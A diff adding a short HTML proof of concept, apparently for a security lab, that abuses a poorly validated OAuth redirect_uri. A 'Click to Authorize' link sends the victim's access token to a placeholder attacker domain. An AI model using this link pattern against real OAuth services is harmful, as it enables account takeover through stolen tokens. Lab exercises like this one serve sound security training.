@@ -1,0 +1,14 @@
+<!-- oauth-open-redirect.html -->
+<!DOCTYPE html>
+<html>
+<head><title>OAuth Open Redirect</title></head>
+<body>
+  <h2>OAuth Abuse POC</h2>
+  <a href="https://auth.example.com/oauth/authorize?client_id=123&redirect_uri=https://attacker.site/evil&response_type=token">
+    Click to Authorize
+  </a>
+</body>
+</html>
+
+
+<!--This lab abuses poorly validated redirect_uri. You trick the victim into authorizing, but the token gets sent to the attacker's domain.-->
